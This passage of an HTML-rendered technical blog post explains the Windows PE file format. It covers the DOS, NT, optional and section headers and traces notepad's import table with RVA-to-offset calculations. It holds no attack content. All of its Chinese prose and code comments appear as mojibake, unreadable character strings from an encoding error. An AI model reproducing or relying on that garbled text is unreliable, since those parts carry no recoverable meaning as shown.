file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>64å­—èŠ‚ï¼Œä¸»è¦æ˜¯ä¸ºäº†å…¼å®¹å½“æ—¶æ¯”è¾ƒç››è¡Œçš„DOSç³»ç»Ÿ,æˆ‘ä»¬åªå…³å¿ƒä¸‹é¢ä¸¤ä¸ª</p><ul><li>e_magic:dosç­¾å 4D5A(MZ)</li><li>e_lfanew:NT&#x2F;PEå¤´åç§»(IMAGE_NT_HEADERS)<ul><li>å¦‚æœè¯¥å€¼ä¸º0ï¼Œåˆ™è¯¥æ–‡ä»¶æ˜¯ä¸€ä¸ªDOSâ€œMZâ€œå¯æ‰§è¡Œæ–‡ä»¶ï¼ŒWindowsä¼šå¯åŠ¨DOSå­ç³»ç»Ÿæ¥æ‰§è¡Œå®ƒï¼Œå¦åˆ™ä¸ºWindowsçš„PEå¯æ‰§è¡Œæ–‡ä»¶</li></ul></li></ul><h3 id="DOSå­˜æ ¹-stub"><a href="#DOSå­˜æ ¹-stub" class="headerlink" title="DOSå­˜æ ¹(stub)"></a>DOSå­˜æ ¹(stub)</h3><p>e_lfanewåç§»å’Œ_IMAGE_DOS_HEADERä¹‹é—´ä½ç½®</p><p>å‰0xdå­—èŠ‚æ˜¯16ä½çš„æ±‡ç¼–ï¼Œè¾“å‡ºThis program cannot be run in DOS mode.åé€€å‡º</p><p>doså¤´çš„e_cs e_ipä¸€èˆ¬æŒ‡å‘è¿™é‡Œ</p><h3 id="NT-x2F-PEå¤´"><a href="#NT-x2F-PEå¤´" class="headerlink" title="NT&#x2F;PEå¤´"></a>NT&#x2F;PEå¤´</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><h4 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h4><p>PEç­¾å 0x50450000(â€œPE00â€)</p><h4 id="æ ‡å‡†PEå¤´-IMAGE-FILE-HEADER-FileHeader"><a href="#æ ‡å‡†PEå¤´-IMAGE-FILE-HEADER-FileHeader" class="headerlink" title="æ ‡å‡†PEå¤´ IMAGE_FILE_HEADER FileHeader"></a>æ ‡å‡†PEå¤´ IMAGE_FILE_HEADER FileHeader</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine;                <span class="comment">// ç›®æ ‡æœºå™¨çš„ä½“ç³»ç»“æ„ç±»å‹ã€‚</span></span><br><span class="line">    WORD    NumberOfSections;       <span class="comment">// æ–‡ä»¶ä¸­çš„èŠ‚çš„æ•°é‡ã€‚</span></span><br><span class="line">    DWORD   TimeDateStamp;          <span class="comment">// æ–‡ä»¶åˆ›å»ºæˆ–ä¿®æ”¹çš„æ—¶é—´æˆ³ã€‚</span></span><br><span class="line">    DWORD   PointerToSymbolTable;   <span class="comment">// COFFç¬¦å·è¡¨çš„æ–‡ä»¶åç§»é‡ã€‚</span></span><br><span class="line">    DWORD   NumberOfSymbols;        <span class="comment">// COFFç¬¦å·è¡¨ä¸­çš„ç¬¦å·æ•°é‡ã€‚</span></span><br><span class="line">    WORD    SizeOfOptionalHeader;   <span class="comment">// å¯é€‰å¤´çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚</span></span><br><span class="line">    WORD    Characteristics;        <span class="comment">// æ–‡ä»¶çš„ç‰¹æ€§æ ‡å¿—ã€‚</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><ul><li>Machine<ul><li>PEæ–‡ä»¶çš„ç›®æ ‡æ¶æ„,æ‰§è¡Œæ–‡ä»¶æ‰€é’ˆå¯¹çš„CPUæˆ–å¤„ç†å™¨æ¶æ„ç±»å‹</li></ul></li><li>NumberOfSections<ul><li>èŠ‚è¡¨æ•°é‡</li></ul></li><li>TimeDateStamp<ul><li>PEæ–‡ä»¶çš„åˆ›å»ºæˆ–ä¿®æ”¹æ—¶é—´æˆ³</li></ul></li><li>PointerToSymbolTable<ul><li>ç¬¦å·è¡¨åœ¨æ–‡ä»¶ä¸­çš„åç§»é‡</li></ul></li><li>SizeOfOptionalHeader<ul><li>IMAGE_OPTIONAL_HEADER32ç»“æ„ä½“é•¿åº¦</li></ul></li><li>Characteristics<ul><li>æ ‡ç¤ºæ–‡ä»¶çš„å±æ€§ æ˜¯å¦ä¸ºdllï¼Œæ˜¯å¦å¯æ‰§è¡Œç­‰ï¼ŒbitORå½¢å¼</li></ul></li></ul><h4 id="æ‰©å±•PEå¤´-IMAGE-OPTIONAL-HEADER32-OptionalHeader"><a href="#æ‰©å±•PEå¤´-IMAGE-OPTIONAL-HEADER32-OptionalHeader" class="headerlink" title="æ‰©å±•PEå¤´ IMAGE_OPTIONAL_HEADER32 OptionalHeader"></a>æ‰©å±•PEå¤´ IMAGE_OPTIONAL_HEADER32 OptionalHeader</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;     <span class="comment">// æ•°æ®ç›®å½•é¡¹åœ¨å†…å­˜ä¸­çš„è™šæ‹Ÿåœ°å€ã€‚</span></span><br><span class="line">    DWORD   Size;               <span class="comment">// æ•°æ®ç›®å½•é¡¹çš„å¤§å°ï¼ˆå­—èŠ‚æ•°ï¼‰ã€‚</span></span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;                         <span class="comment">// é­”æœ¯å­—æ®µï¼Œæ ‡è¯†å¯é€‰å¤´çš„æ ¼å¼ï¼ˆ32ä½æˆ–64ä½ï¼‰ã€‚</span></span><br><span class="line">    BYTE    MajorLinkerVersion;            <span class="comment">// é“¾æ¥å™¨çš„ä¸»ç‰ˆæœ¬å·ã€‚</span></span><br><span class="line">    BYTE    MinorLinkerVersion;            <span class="comment">// é“¾æ¥å™¨çš„æ¬¡ç‰ˆæœ¬å·ã€‚</span></span><br><span class="line">    DWORD   SizeOfCode;                    <span class="comment">// ä»£ç æ®µçš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚</span></span><br><span class="line">    DWORD   SizeOfInitializedData;         <span class="comment">// å·²åˆå§‹åŒ–æ•°æ®æ®µçš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚</span></span><br><span class="line">    DWORD   SizeOfUninitializedData;       <span class="comment">// æœªåˆå§‹åŒ–æ•°æ®æ®µçš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚</span></span><br><span class="line">    DWORD   AddressOfEntryPoint;           <span class="comment">// ç¨‹åºå…¥å£ç‚¹ï¼ˆç¨‹åºçš„èµ·å§‹æ‰§è¡Œåœ°å€ï¼‰ç›¸å¯¹äºæ˜ åƒåŸºå€çš„åç§»é‡ã€‚</span></span><br><span class="line">    DWORD   BaseOfCode;                    <span class="comment">// ä»£ç æ®µçš„èµ·å§‹åœ°å€ç›¸å¯¹äºæ˜ åƒåŸºå€çš„åç§»é‡ã€‚</span></span><br><span class="line">    DWORD   BaseOfData;                    <span class="comment">// æ•°æ®æ®µï¼ˆä»…ç”¨äºPE32ï¼‰çš„èµ·å§‹åœ°å€ç›¸å¯¹äºæ˜ åƒåŸºå€çš„åç§»é‡ã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;                     <span class="comment">// ç¨‹åºçš„é¦–é€‰è£…è½½åœ°å€ï¼ˆæ˜ åƒåŸºå€ï¼‰ã€‚</span></span><br><span class="line">    DWORD   SectionAlignment;              <span class="comment">// èŠ‚çš„å†…å­˜å¯¹é½å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚</span></span><br><span class="line">    DWORD   FileAlignment;                 <span class="comment">// æ–‡ä»¶å¯¹é½å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion;   <span class="comment">// æ“ä½œç³»ç»Ÿçš„ä¸»ç‰ˆæœ¬å·è¦æ±‚ã€‚</span></span><br><span class="line">    WORD    MinorOperatingSystemVersion;   <span class="comment">// æ“ä½œç³»ç»Ÿçš„æ¬¡ç‰ˆæœ¬å·è¦æ±‚ã€‚</span></span><br><span class="line">    WORD    MajorImageVersion;             <span class="comment">// æ˜ åƒæ–‡ä»¶çš„ä¸»ç‰ˆæœ¬å·ã€‚</span></span><br><span class="line">    WORD    MinorImageVersion;             <span class="comment">// æ˜ åƒæ–‡ä»¶çš„æ¬¡ç‰ˆæœ¬å·ã€‚</span></span><br><span class="line">    WORD    MajorSubsystemVersion;         <span class="comment">// å­ç³»ç»Ÿçš„ä¸»ç‰ˆæœ¬å·è¦æ±‚ã€‚</span></span><br><span class="line">    WORD    MinorSubsystemVersion;         <span class="comment">// å­ç³»ç»Ÿçš„æ¬¡ç‰ˆæœ¬å·è¦æ±‚ã€‚</span></span><br><span class="line">    DWORD   Win32VersionValue;             <span class="comment">// ä¿ç•™å­—æ®µï¼Œç”¨äºæŒ‡å®šWin32è¿è¡Œæ—¶ç‰ˆæœ¬ã€‚</span></span><br><span class="line">    DWORD   SizeOfImage;                   <span class="comment">// æ˜ åƒçš„å†…å­˜å¤§å°ï¼ŒåŒ…æ‹¬æ‰€æœ‰å¤´å’ŒèŠ‚çš„å¤§å°ã€‚</span></span><br><span class="line">    DWORD   SizeOfHeaders;                 <span class="comment">// å¤´çš„æ€»å¤§å°ï¼ŒåŒ…æ‹¬æ‰€æœ‰å¤´çš„å¤§å°ã€‚</span></span><br><span class="line">    DWORD   CheckSum;                      <span class="comment">// æ˜ åƒæ–‡ä»¶çš„æ ¡éªŒå’Œã€‚</span></span><br><span class="line">    WORD    Subsystem;                     <span class="comment">// ç¨‹åºæ‰€ä¾èµ–çš„å­ç³»ç»Ÿç±»å‹ã€‚</span></span><br><span class="line">    WORD    DllCharacteristics;            <span class="comment">// DLLæ–‡ä»¶çš„ç‰¹æ€§æ ‡å¿—ã€‚</span></span><br><span class="line">    DWORD   SizeOfStackReserve;            <span class="comment">// åˆå§‹åŒ–å †æ ˆçš„ä¿ç•™å†…å­˜å¤§å°ã€‚</span></span><br><span class="line">    DWORD   SizeOfStackCommit;             <span class="comment">// åˆå§‹åŒ–å †æ ˆçš„æäº¤å†…å­˜å¤§å°ã€‚</span></span><br><span class="line">    DWORD   SizeOfHeapReserve;             <span class="comment">// åˆå§‹åŒ–å †çš„ä¿ç•™å†…å­˜å¤§å°ã€‚</span></span><br><span class="line">    DWORD   SizeOfHeapCommit;              <span class="comment">// åˆå§‹åŒ–å †çš„æäº¤å†…å­˜å¤§å°ã€‚</span></span><br><span class="line">    DWORD   LoaderFlags;                   <span class="comment">// åŠ è½½å™¨æ ‡å¿—ã€‚</span></span><br><span class="line">    DWORD   NumberOfRvaAndSizes;           <span class="comment">// æ•°æ®ç›®å½•é¡¹çš„æ•°é‡ã€‚</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];   <span class="comment">// æ•°æ®ç›®å½•æ•°ç»„ã€‚</span></span><br><span class="line"></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32</span><br></pre></td></tr></table></figure><ul><li><p>Magic</p><ul><li>32ä½ä¸º0x10Bï¼Œ64ä½ä¸º0x20B</li></ul></li><li><p>AddressOfEntryPoint</p><ul><li>RVAå€¼ï¼Œç¨‹åºå…¥å£ç‚¹</li></ul></li><li><p>ImageBase</p><ul><li>PEæ–‡ä»¶è¢«åŠ è½½åˆ°å†…å­˜åœ°å€ï¼ŒåŠ è½½å®Œåï¼ŒEIPæŒ‡å‘ImageBase+AddressOfEntryPoint</li></ul></li><li><p>SizeOfImage</p><ul><li>PEæ–‡ä»¶è£…è½½åˆ°è™šæ‹Ÿå†…å­˜åçš„å¤§å°</li></ul></li><li><p>SizeOfHeaders</p><ul><li>PEå¤´æŒ‰ç…§FileAlignmentå¯¹é½åçš„å¤§å°ï¼ŒåŒ…æ‹¬section head</li></ul></li><li><p>Subsystem</p><ul><li>åŒºåˆ†ç³»ç»Ÿæ–‡ä»¶å’Œæ™®é€šå¯æ‰§è¡Œæ–‡ä»¶</li><li>ç³»ç»Ÿé©±åŠ¨ï¼šdrive çª—å£ï¼šGUI æ§åˆ¶å°ï¼šCUI ç­‰</li></ul></li><li><p>NumberOfRvaAndSizes</p><ul><li>DataDirectoryæ•°ç›®</li></ul></li><li><p>DataDirectory</p><ul><li><table><thead><tr><th>æ•°æ®ç›®å½•é¡¹</th><th>ç´¢å¼•ä½ç½®</th></tr></thead><tbody><tr><td>å¯¼å‡ºè¡¨ï¼ˆExport Tableï¼‰</td><td><code>IMAGE_DIRECTORY_ENTRY_EXPORT</code> (0)</td></tr><tr><td>å¯¼å…¥è¡¨ï¼ˆImport Tableï¼‰</td><td><code>IMAGE_DIRECTORY_ENTRY_IMPORT</code> (1)</td></tr><tr><td>èµ„æºè¡¨ï¼ˆResource Tableï¼‰</td><td><code>IMAGE_DIRECTORY_ENTRY_RESOURCE</code> (2)</td></tr><tr><td>å¼‚å¸¸è¡¨ï¼ˆException Tableï¼‰</td><td><code>IMAGE_DIRECTORY_ENTRY_EXCEPTION</code> (3)</td></tr><tr><td>å®‰å…¨è¡¨ï¼ˆSecurity Tableï¼‰</td><td><code>IMAGE_DIRECTORY_ENTRY_SECURITY</code> (4)</td></tr><tr><td>é‡å®šä½è¡¨ï¼ˆBase Relocation Tableï¼‰</td><td><code>IMAGE_DIRECTORY_ENTRY_BASERELOC</code> (5)</td></tr><tr><td>è°ƒè¯•è¡¨ï¼ˆDebug Tableï¼‰</td><td><code>IMAGE_DIRECTORY_ENTRY_DEBUG</code> (6)</td></tr><tr><td>ç‰ˆæœ¬ä¿¡æ¯ï¼ˆVersion Informationï¼‰</td><td><code>IMAGE_DIRECTORY_ENTRY_ARCHITECTURE</code> (7)</td></tr><tr><td>å…¨å±€æŒ‡é’ˆï¼ˆGlobal Pointerï¼‰</td><td><code>IMAGE_DIRECTORY_ENTRY_GLOBALPTR</code> (8)</td></tr><tr><td>TLSè¡¨ï¼ˆThread Local Storage Tableï¼‰</td><td><code>IMAGE_DIRECTORY_ENTRY_TLS</code> (9)</td></tr><tr><td>è½½å…¥é…ç½®è¡¨ï¼ˆLoad Configuration Tableï¼‰</td><td><code>IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG</code> (10)</td></tr><tr><td>ç»‘å®šå¯¼å…¥è¡¨ï¼ˆBound Import Tableï¼‰</td><td><code>IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT</code> (11)</td></tr><tr><td>IATè¡¨ï¼ˆImport Address Tableï¼‰</td><td><code>IMAGE_DIRECTORY_ENTRY_IAT</code> (12)</td></tr><tr><td>å»¶è¿Ÿå¯¼å…¥æè¿°ç¬¦ï¼ˆDelay Import Descriptorï¼‰</td><td><code>IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</code> (13)</td></tr><tr><td>COMè¿è¡Œæ—¶æè¿°ç¬¦ï¼ˆCOM Runtime Descriptorï¼‰</td><td><code>IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR</code> (14)</td></tr><tr><td>ä¿ç•™ï¼ˆReservedï¼‰</td><td><code>IMAGE_DIRECTORY_ENTRY_RESERVED</code> (15)</td></tr></tbody></table></li></ul></li></ul><h3 id="èŠ‚åŒºå¤´"><a href="#èŠ‚åŒºå¤´" class="headerlink" title="èŠ‚åŒºå¤´"></a>èŠ‚åŒºå¤´</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SIZEOF_SHORT_NAME              8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];   <span class="comment">// èŠ‚åç§°ï¼Œæœ€å¤š8ä¸ªå­—ç¬¦ï¼ˆå¦‚æœåç§°é•¿åº¦ä¸è¶³8ä¸ªå­—ç¬¦ï¼Œç”¨ç©ºæ ¼å¡«å……ï¼‰ã€‚</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   PhysicalAddress;              <span class="comment">// åœ¨ç‰©ç†åœ°å€çš„ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨çš„èŠ‚çš„ç‰©ç†åœ°å€ã€‚</span></span><br><span class="line">        DWORD   VirtualSize;                  <span class="comment">// åœ¨å†…å­˜ä¸­åˆ†é…ç»™èŠ‚çš„è™šæ‹Ÿå¤§å°ã€‚</span></span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;                   <span class="comment">// èŠ‚çš„è™šæ‹Ÿåœ°å€ï¼ˆç›¸å¯¹äºæ˜ åƒåŸºå€çš„åç§»é‡ï¼‰ã€‚</span></span><br><span class="line">    DWORD   SizeOfRawData;                     <span class="comment">// èŠ‚çš„åœ¨æ–‡ä»¶ä¸­å ç”¨çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚</span></span><br><span class="line">    DWORD   PointerToRawData;                  <span class="comment">// èŠ‚åœ¨æ–‡ä»¶ä¸­çš„åç§»é‡ã€‚</span></span><br><span class="line">    DWORD   PointerToRelocations;              <span class="comment">// é‡å®šä½è¡¨çš„æ–‡ä»¶åç§»é‡ã€‚</span></span><br><span class="line">    DWORD   PointerToLinenumbers;              <span class="comment">// è¡Œå·è¡¨çš„æ–‡ä»¶åç§»é‡ã€‚</span></span><br><span class="line">    WORD    NumberOfRelocations;               <span class="comment">// é‡å®šä½é¡¹çš„æ•°é‡ã€‚</span></span><br><span class="line">    WORD    NumberOfLinenumbers;               <span class="comment">// è¡Œå·é¡¹çš„æ•°é‡ã€‚</span></span><br><span class="line">    DWORD   Characteristics;                   <span class="comment">// èŠ‚çš„ç‰¹æ€§æ ‡å¿—ã€‚</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>RAW(æ–‡ä»¶åç§»)&#x3D;RVA-VirtualAddress+PointerToRawData</p><blockquote><p>è¿™ä¸ªæ¢ç®—æœ‰æ—¶å€™æ˜¯ä¸å¯¹çš„ï¼Œæ¯”å¦‚è¯´æœ‰æœªåˆå§‹åŒ–åˆå§‹çš„æ•°æ®èŠ‚ï¼Œä¸ºäº†èŠ‚çº¦ç£ç›˜ç©ºé—´ï¼ŒVirtualSizeæ¯”SizeOfRawDataè¦å¤§ï¼Œæ¢ç®—åèŠ‚åŒºä¼šä¸ä¸€æ ·ã€</p></blockquote><p>PEå¤´å†…çš„è¯ RAW&#x3D;RVA</p><h2 id="å¯¼å…¥è¡¨"><a href="#å¯¼å…¥è¡¨" class="headerlink" title="å¯¼å…¥è¡¨"></a>å¯¼å…¥è¡¨</h2><p>_IMAGE_OPTIONAL_HEADERé‡ŒDataDirectoryçš„ç¬¬äºŒé¡¹ï¼Œå¯¼å…¥å¤šå°‘ä¸ªåº“å°±æœ‰å¤šå°‘ä¸ª_IMAGE_IMPORT_DESCRIPTORç»“æ„ï¼Œæœ€åä»¥ä¸€ä¸ªç©ºç»“æ„ä½“ç»“å°¾</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p><strong>ä»¥notepadä¸ºä¾‹</strong></p><p>&gt;&gt;&gt;<strong>Name</strong></p><p>å°±æ˜¯å½“å‰æ¨¡å—ä¾èµ–æ¨¡å—åå­—</p><p><img src="/2023/05/19/PE-FILE/image-20230519163927062.png" alt="image-20230519163927062"></p><p>0x7604æ˜¯RVA</p><p><img src="/2023/05/19/PE-FILE/image-20230519164252693.png" alt="image-20230519164252693"></p><p>å¯ä»¥çœ‹å‡º0x7604ä»–åœ¨ç¬¬ä¸€ä¸ªsection(PEæ–‡ä»¶çš„sectionç›¸æ¯”äºELFå¾ˆå°‘)</p><p>RAW&#x3D;RVA-VirtualAddress+PointerToRawData&#x3D;0x7604-0x1000+0x400&#x3D;0x6A04</p><p><img src="/2023/05/19/PE-FILE/image-20230519164805090.png" alt="image-20230519164805090"></p><p>ä»–çš„nameå­—æ®µå°±æ˜¯0x7AACï¼ŒåŒæ ·ä½äºç¬¬ä¸€ä¸ªèŠ‚åŒºRAW&#x3D;0x7AAC-0x1000+0x400&#x3D;0x6EAC</p><p><img src="/2023/05/19/PE-FILE/image-20230519164941785.png" alt="image-20230519164941785"></p><p><img src="/2023/05/19/PE-FILE/image-20230519165226573.png" alt="image-20230519165226573"></p><p><strong>ä»–çš„OriginalFirstThunkå’ŒFirstThunkåˆ†åˆ«æŒ‡å‘INT(Import Name Table ï¼Œå¯¼å…¥åç§°è¡¨) å’ŒIATï¼ˆImport Address Table ï¼Œå¯¼å…¥åœ°å€è¡¨ï¼‰</strong></p><p>&gt;&gt;&gt;<strong>OriginalFirstThunk:INTè¡¨</strong>(å¯¼å…¥åç§°è¡¨)</p><p>æŒ‡å‘_IMAGE_THUNK_DATA32æ•°ç»„çš„RVA</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD ForwarderString;      <span class="comment">// æŒ‡å‘è½¬å‘å­—ç¬¦ä¸²çš„æŒ‡é’ˆï¼ˆPBYTEï¼‰ã€‚</span></span><br><span class="line">        DWORD Function;             <span class="comment">// æŒ‡å‘å‡½æ•°åœ°å€çš„æŒ‡é’ˆï¼ˆPDWORDï¼‰ã€‚</span></span><br><span class="line">        DWORD Ordinal;              <span class="comment">// å¯¼å…¥å‡½æ•°çš„åºå·ï¼ˆç”¨äºæŒ‰åºå·å¯¼å…¥ï¼‰ã€‚</span></span><br><span class="line">        DWORD AddressOfData;        <span class="comment">// æŒ‡å‘ IMAGE_IMPORT_BY_NAME ç»“æ„çš„æŒ‡é’ˆï¼ˆPIMAGE_IMPORT_BY_NAMEï¼‰ã€‚</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;       <span class="comment">// å‡½æ•°åç§°çš„æç¤ºï¼ˆç”¨äºåŠ é€Ÿå¯¼å…¥çš„æŸ¥æ‰¾è¿‡ç¨‹ï¼‰ã€‚</span></span><br><span class="line">    CHAR   Name[<span class="number">1</span>];    <span class="comment">// å‡½æ•°åç§°ï¼ˆä»¥NULLç»“å°¾çš„ASCIIå­—ç¬¦ä¸²ï¼‰ã€‚</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><blockquote><p>u1çš„æœ€é«˜ä½ä¸º1ï¼Œå»é™¤è¿™ä¸ª1ï¼Œå…¶ä½™å°±æ˜¯å¯¼å…¥å‡½æ•°çš„åºå·Ordinalï¼Œå¦åˆ™å°±æ˜¯AddressOfData</p></blockquote><p><img src="/2023/05/19/PE-FILE/image-20230519171519020.png" alt="image-20230519171519020"></p><p>RAW&#x3D;0x6D90 0x6D90å¤„å°±æ˜¯_IMAGE_THUNK_DATA32æ•°ç»„ï¼ŒåŒæ ·ä»¥NULLç»“æ„ä½“ç»“å°¾</p><p><img src="/2023/05/19/PE-FILE/image-20230519172810749.png" alt="image-20230519172810749"></p><p>RVA&#x3D;0x7A7A RAW&#x3D;0x6E7Aï¼ŒæŒ‡å‘_IMAGE_IMPORT_BY_NAMEç»“æ„ä½“</p><p><img src="/2023/05/19/PE-FILE/image-20230519172307227.png" alt="image-20230519172307227"></p><p>0xFä¸ºåº“ä¸­å‡½æ•°åºå·ï¼Œåé¢æ˜¯å¯¼å…¥å‡½æ•°åç§°</p><p>åé¢0x7a5e RAWä¸º0x6e50</p><p><img src="/2023/05/19/PE-FILE/image-20230519172921483.png" alt="image-20230519172921483"></p><p>&gt;&gt;&gt;<strong>FirstThunk:IATè¡¨</strong>(å¯¼å…¥åœ°å€è¡¨)</p><p>åŒæ ·æ˜¯æŒ‡å‘_IMAGE_THUNK_DATA32æ•°ç»„çš„RVA</p><p><img src="/2023/05/19/PE-FILE/image-20230519174316053.png" alt="image-20230519174316053"></p><p>RAWä¸º0x6c4</p><p><img src="/2023/05/19/PE-FILE/image-20230519174410251.png" alt="image-20230519174410251"></p><p>ä¸€å †ä¸æ˜æ‰€ä»¥çš„æ•°æ®</p><p>ä¸¢åˆ°x32dbgçœ‹çœ‹</p><blockquote><p>ç”±äºå¯æ‰§è¡Œæ–‡ä»¶PEæ˜¯æ˜¯è¿›ç¨‹ç¬¬ä¸€ä¸ªåŠ è½½çš„æ¨¡å—ï¼Œæ‰€ä»¥ä»–å‡ ä¹ç™¾åˆ†ç™¾éƒ½èƒ½æŠ¢åˆ°ä»–åŸæ¥çš„imagebase(é™¤äº†å¼€äº†aslrçš„æƒ…å†µ)ï¼Œä¸éœ€è¦å»åšé‡å®šä½ï¼Œæ‰€ä»¥è¿™ä¸ªIATåœ°å€ç›´æ¥å°±æ˜¯RVA+ImageBase</p></blockquote><p>RVA+ImageBase&#x3D;0x10012c4</p><p><img src="/2023/05/19/PE-FILE/image-20230519180741267.png" alt="image-20230519180741267"></p><p><img 